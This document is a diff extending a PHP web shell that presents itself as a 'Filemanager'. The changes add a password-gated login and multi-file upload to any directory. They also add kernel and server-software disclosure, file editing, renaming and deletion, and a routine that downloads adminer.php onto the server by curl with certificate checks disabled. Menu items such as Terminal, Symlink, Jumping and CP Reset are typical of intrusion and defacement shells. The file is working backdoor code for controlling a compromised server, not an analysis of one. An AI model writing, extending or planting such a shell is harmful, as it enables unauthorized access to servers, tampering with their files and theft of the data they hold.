@@ -1,3 +1,87 @@
+<?php
+
+session_start();
+set_time_limit(0);
+$password = '$2y$10$HI5sBrenjZyy88tGWKnCwOLnHf09C5LfLcz09Qe9ZK8M4oLBqXDrO';
+function login() {
+	?>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<style type="text/css">
+		@import url('https://fonts.googleapis.com/css2?family=Pangolin&display=swap');
+		body {
+			font-family: 'Pangolin', cursive;
+			background: #f0f2f5;
+			color: #8a8a8a;
+		}
+		table {
+			position: static;
+			background: #fff;
+			box-shadow: 0px 0px 0px 6px #fff;
+			border-top: 0px solid #fff;
+			border-bottom: 20px solid #fff;
+			border-right: 20px solid #fff;
+			border-left: 20px solid #fff;
+			border-radius:3px;
+			border-spacing:0;
+		}
+		th {
+			padding:12px;
+			font-size:30px;
+			font-weight: bold;
+		}
+		td {
+			border: 6px solid #000;
+			padding:5px;
+			border:none;
+		}
+		input {
+			width:100%;
+			background: #f0f2f5;
+			outline: none;
+			border-radius:5px;
+			border: 1px solid #f2f2f2;
+			padding:7px;
+		}
+		@media (min-width: 320px) and (max-width: 480px) {
+			table {
+				width:100%;
+			}
+		}
+	</style>
+	<br><br><br><br><br><br><br><br><br><br><br><br><br><br>
+	<form method="post">
+		<table align="center" width="20%">
+			<tr>
+				<thead>
+					<th>LOGIN</th>
+				</thead>
+			</tr>
+			<tr><thead><th></th></thead></tr>
+			<tbody>
+				<tr>
+					<td>
+						<input type="password" name="password">
+					</td>
+				</tr>
+			</tbody>
+		</table>
+	</form>
+	<?php
+	exit();
+}
+function logout() {
+	unset($_SESSION['login']);
+	?> <script>window.location='http://<?= $_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'] ?>'</script> <?php
+}
+if (!isset($_SESSION['login'])) {
+	if (empty($password) || (isset($_POST['password']) && (password_verify($_POST['password'], $password)))) {
+		$_SESSION['login'] = true;
+		?> <script>window.location='?cd=<?= x::hex(str_replace($_SERVER['SCRIPT_NAME'] , '', getcwd().$_SERVER['SCRIPT_NAME'])) ?>'</script> <?php
+	} else {
+		login();
+	}
+}
+?>
 <meta name="viewport" content="width=device-width,height=device-height initial-scale=1">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flexboxgrid/6.3.1/flexboxgrid.min.css" type="text/css" >
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css"/>
@@ -35,13 +119,13 @@
 		border-right: 1px solid #f2f2f2;
 	}
 	span.home {
-		margin-left: 15px;
+		margin-left: 10px;
 		font-size:25px;
 		font-weight: bold;
 	}
 	div.center {
 		background: #fff;
-		overflow: auto;
+		overflow: hidden;
 		max-height:550px;
 		border-radius:0px 0px 5px 0px;
 		padding:20px;
@@ -109,6 +193,36 @@
 		border:1px solid #e0e0e0;
 		box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
 	}
+	div.filemanager {
+		padding:10px;
+		padding-bottom: 2px;
+	}
+	div.files {
+		padding:35px 15px 10px 10px 5px;
+		padding:15px;
+		width:95%;
+		border-radius:7px;
+		overflow: auto;
+		background:#fff;
+		border:1px solid #e0e0e0;
+		box-shadow: 0 0px 1.5px rgba(0,0,0,0.15), 0 0px 1.5px rgba(0,0,0,0.16);
+	}
+	div.infiles {
+		max-height:440px;
+		overflow: auto;
+	}
+	div.pwd {
+		background: var(--color-bg);
+		border: 1px solid #f2f2f2;
+		text-align: center;
+		padding: 10px;
+		color: #1889f5;
+		font-weight: bold;
+		border-radius:5px;
+	}
+	a.pwd {
+		color: #1889f5;
+	}
 	div.edit span {
 		font-weight: bold;
 	}
@@ -154,6 +268,10 @@
 		margin-top:5px;
         width:24px;
         height:24px;
+    }
+    a.alert {
+    	font-weight: bold;
+    	color: #1889f5;
     }
 	.filename, .textarea, .submit {
 		padding:3px;
@@ -329,9 +447,11 @@
 <div class="container">
 	<div class="row">
 		<div class="header">
-			<span class="home">
-				<a href="?">HOME</a>
-			</span>
+			<div class="filemanager">
+				<span class="home">
+					Filemanager
+				</span>
+			</div>
 		</div>
 	</div>
 	<?php
@@ -347,7 +467,7 @@
 			return str_replace('\\', DIRECTORY_SEPARATOR, getcwd());
 		}
 		public static function cd($directory) {
-			return chdir($directory);
+			return @chdir($directory);
 		}
 		public static function files($type) {
 			$result = array();
@@ -390,10 +510,10 @@
 			self::$result = '';
 			foreach (self::$path as $key => $value) {
 				if ($value == '' && $key == 0) {
-					self::$result = "<a href='?cd=".self::hex(DIRECTORY_SEPARATOR)."'>".DIRECTORY_SEPARATOR."</a>";
+					self::$result = "<a class='pwd' href='?cd=".self::hex(DIRECTORY_SEPARATOR)."'>".DIRECTORY_SEPARATOR."</a>";
 					continue;
 				} if ($value == '') continue;
-				self::$result .= "<a href='?cd=";
+				self::$result .= "<a class='pwd' href='?cd=";
 				self::$link = '';
 				for ($i=0; $i < $key ; $i++) { 
 					self::$link .= self::$path[$i];
@@ -406,11 +526,6 @@
 		public static function perms($filename) {
 			return substr(sprintf("%o", fileperms($filename)), -4);
 		}
-		public static function redirct($url, $permanent = false) {
-			if (headers_sent() === false) {
-				header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
-			} exit;
-		}
 		public static function w__($filename, $perms) {
         	if (is_writable($filename)) {
             	return "<font color='green'>{$perms}</font>";
@@ -420,6 +535,12 @@
     	}
     	public static function info($info = null) {
     		switch ($info) {
+    			case 'software':
+    				return $_SERVER['SERVER_SOFTWARE'];
+    				break;
+    			case 'kernel':
+    				return php_uname();
+    				break;
     			case 'phpversion':
     				return phpversion();
     				break;
@@ -557,6 +678,21 @@
     	public static function chname($filename, $newname) {
     		return rename($filename, $newname);
     	}
+    	public static function adminer($url, $data) {
+    		self::$handle = fopen($data, "w");
+    		$ch = curl_init();
+    		curl_setopt($ch, CURLOPT_URL, $url);
+			curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
+			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+			curl_setopt($ch, CURLOPT_FILE, self::$handle);
+			return curl_exec($ch);
+			curl_close($ch);
+			fclose(self::$handle);
+			ob_flush();
+			flush();
+
+    	}
     	public static function size($filename) {
         	if (is_file($filename)) {
             	$filepath = $filename;
@@ -576,43 +712,51 @@
 	?>
 	<div class="row">
 		<div class="col-xs-2 tool">
-			<a href="?cd=<?= x::hex(x::cwd()) ?>&info">
+			<a href="?cd=<?= x::hex(str_replace($_SERVER['SCRIPT_NAME'] , '', getcwd().$_SERVER['SCRIPT_NAME'])) ?>">
+				<i class="fa fa-home" aria-hidden="true"></i>
+				<span>Home</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>">
+				<i class="fa fa-file" aria-hidden="true"></i>
+				<span>Files</span>
+			</a>
+			<a href="?cd=<?= $_GET['cd'] ?>&info">
 				<i class="fa fa-info-circle" aria-hidden="true"></i> 
 				 <span>Info</span>
 			</a>
-			<a href="?coomingsoong">
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fa fa-terminal" aria-hidden="true"></i>
 				<span>Terminal</span>
 			</a>
-			<a href="?coomingsoong">
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fa fa-cogs"></i>
 				<span>Config</span>
 			</a>
-			<a href="?coomingsoong">
+			<a href="?cd=<?= x::hex(x::cwd()) ?>&adminer">
 				<i class="fa fa-user"></i>
 				<span>Adminer</span>
 			</a>
-			<a href="?coomingsoong">
+			<a href="?cd=<?= $_GET['cd'] ?>&upload">
 				<i class="fa fa-upload"></i>
 				<span>Upload</span>
 			</a>
-			<a href="?coomingsoong">
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fa fa-exclamation-triangle"></i>
 				<span>Jumping</span>
 			</a>
-			<a href="?coomingsoong">
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fa fa-exclamation-circle"></i>
 				<span>Symlink</span>
 			</a>
-			<a href="?coomingsoong">
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fas fa-network-wired"></i>
 				<span>Network</span>
 			</a>
-			<a href="?cd=<?= x::hex(x::cwd()) ?>&x=make">
+			<a href="?cd=<?= $_GET['cd'] ?>&x=make">
 				<i class="fa fa-plus-square" aria-hidden="true"></i>
 				<span>Add File</span>
 			</a>
-			<a href="?coomingsoong">
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fa fa-exclamation-triangle"></i>
 				<span>Replace</span>
 			</a>
@@ -620,21 +764,53 @@
 				<i class="fa fa-users" aria-hidden="true"></i>
 				<span>Join Us</span>
 			</a>
-			<a href="?coomingsoong">
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fa fa-bug" aria-hidden="true"></i>
 				<span>CP Reset</span>
 			</a>
-			<a href="?coomingsoong">
+			<a href="?cd=<?= $_GET['cd'] ?>&coomingsoong">
 				<i class="fa fa-info"></i>
 				<span>About me</span>
 			</a>
-			<a href="?coomingsoong">
+			<a href="?logout">
 				<i class="fa fa-power-off" aria-hidden="true"></i>
 				<span>Logout</span>
 			</a>
 		</div>
 		<div class="col-xs-10 center">
 			<?php
+			if (isset($_GET['upload'])) {
+				if (isset($_POST['upload'])) {
+					$files = count($_FILES['file']['tmp_name']);
+					for ($i=0; $i < $files ; $i++) { 
+						if (copy($_FILES['file']['tmp_name'][$i] , x::unhex($_GET['cd']). DIRECTORY_SEPARATOR .$_FILES['file']['name'][$i])) {
+							print("success");
+						} else {
+							print("failed");
+						}
+					}
+				}
+				?>
+				<form method="post" enctype="multipart/form-data">
+					<input type="file" name="file[]" multiple>
+					<button type="submit" name="upload">Upload</button>
+				</form>
+				<?php
+				exit();
+			}
+			if (isset($_GET['logout'])) {
+				logout();
+			}
+			if (isset($_GET['adminer'])) {
+				if (x::adminer("https://www.adminer.org/static/download/4.7.7/adminer-4.7.7.php", "adminer.php")) {
+					print("<script>
+								alert('<i><a class=alert href=adminer.php>adminer.php</a></i> was created')
+						   </script>"
+						);
+				} else {
+					print("<script>alert('permission danied')</script>");
+				} 
+			}
 			if (isset($_GET['coomingsoong'])) {
 				print("<script>alert('<h2>Cooming Soon</h2>')</script>");
 			}
@@ -643,9 +819,19 @@
 				<div class="infos">
 					<table width="100%">
 						<tr>
+							<td>System</td>
+							<td>:</td>
+							<td><?= x::info("kernel") ?></td>
+						</tr>
+						<tr>
 							<td>PHP Version</td>
 							<td>:</td>
 							<td><?= x::info("phpversion") ?></td>
+						</tr>
+						<tr>
+							<td>Software</td>
+							<td>:</td>
+							<td><?= x::info("software") ?></td>
 						</tr>
 						<tr>
 							<td>Domain</td>
@@ -858,49 +1044,59 @@
 						}
 					}
 					?>
-					<form method="post">
-						<div class="edit">
-							<table width='100%' class="edit">
-								<tr>
-									<td style="width:1;" class="edit-header">
-										<a href="?cd=<?= $_GET['cd'] ?>">
-											<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
-										</a>
-									</td>
-									<td class="action" colspan="2">
-										<span>EDIT</span>
-									</td>
+					<div class="edit">
+						<table width='100%' class="edit">
+							<tr>
+								<td style="width:1;" class="edit-header">
+									<a href="?cd=<?= $_GET['cd'] ?>">
+										<img class="icons" src="https://image.flaticon.com/icons/svg/786/786399.svg">
+									</a>
+								</td>
+								<td class="action" colspan="2">
+									<span>EDIT</span>
+								</td>
+							</tr>
+							<tr>
+								<td style="width:120px;">
+									Filename
+								</td>
+								<td>:</td>
+								<td>
+									<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
+								</td>
 								</tr>
-								<tr>
-									<td style="width:120px;">
-										Filename
+							<tr>
+								<td style="width:120px;">
+									Size
+								</td>
+								<td>:</td>
+								<td>
+									<?= x::size($_POST['file']) ?>
+								</td>
+							</tr>
+							<tr>
+								<td style="width:120px;">
+									Last Modif
+								</td>
+								<td>:</td>
+								<td>
+									<?= x::ftime($_POST['file']) ?>
+								</td>
+							</tr>
+							<tr>
+								<form method="post" action="?cd=<?= $_GET['cd'] ?>">
+									<td colspan="3">
+										<button disabled>Edit</button>
+										<button name="action" value="chname">Rename</button>
+										<button name="action" value="delete">Delete</button>
 									</td>
-									<td>:</td>
-									<td>
-										<?= x::w__($_POST['file'], basename($_POST['file'])) ?>
-									</td>
-								</tr>
-								<tr>
-									<td style="width:120px;">
-										Size
-									</td>
-									<td>:</td>
-									<td>
-										<?= x::size($_POST['file']) ?>
-									</td>
-								</tr>
-								<tr>
-									<td style="width:120px;">
-										Last Modif
-									</td>
-									<td>:</td>
-									<td>
-										<?= x::ftime($_POST['file']) ?>
-									</td>
-								</tr>
+									<input type="hidden" name="file" value="<?= x::hex($_POST['file']) ?>">
+								</form>
+							</tr>
+							<form method="post">
 								<tr>
 									<td colspan="3">
-										<textarea name="data" placeholder="not writable"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
+										<textarea name="data"><?= htmlspecialchars(file_get_contents($_POST['file'])) ?></textarea>
 									</td>
 								</tr>
 								<tr>
@@ -920,12 +1116,13 @@
 				if (isset($_GET['cd'])) {
 					x::cd(x::unhex($_GET['cd']));
 				}
-				?><table width="100%">
-					<tr>
-						<td colspan="5">
-							<center><?= x::pwd() ?></center>
-						</td>
-					</tr>
+				?>
+				<div class="files">
+					<div class="pwd">
+						<?= x::pwd() ?> ( <?= x::w__(x::unhex($_GET['cd']), 'writable') ?> )
+					</div>
+					<div class="infiles">
+				<table width="100%">
 				<?php
 				foreach (x::files('dir') as $dir) { ?>
 					<form method="post" action="?cd=<?= x::hex(x::cwd()) ?>">
@@ -990,6 +1187,8 @@
 				<?php }
 				?>
 			</table>
+		</div>
+		</div>
 		</div>
 	</div>
 </div>
